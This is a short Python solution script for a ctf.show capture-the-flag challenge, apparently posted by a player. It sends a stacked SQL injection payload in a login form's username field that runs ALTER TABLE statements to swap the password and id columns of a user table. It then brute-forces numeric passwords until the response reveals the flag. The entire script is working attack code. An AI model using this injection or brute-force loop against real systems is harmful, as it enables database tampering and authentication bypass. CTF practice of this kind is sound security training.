#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/6/15 22:53
# blog: www.wlhhlc.top
import requests

url = "http://db7ddf7f-82ef-4157-9cab-e96e500d80a5.challenge.ctf.show/api/"
payload = '0x61646d696e;alter table ctfshow_user change column `pass` `dotast` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `dotast` `id` varchar(255);'
data1 = {
    'username': payload,
    'password': '1'
}
res = requests.post(url=url, data=data1)

for i in range(99):
    data2 = {
        'username': "0x61646d696e",
        'password': f'{i}'
    }
    res2 = requests.post(url=url, data=data2)
    if "flag" in res2.json()['msg']:
        print(res2.json()['msg'])
        break
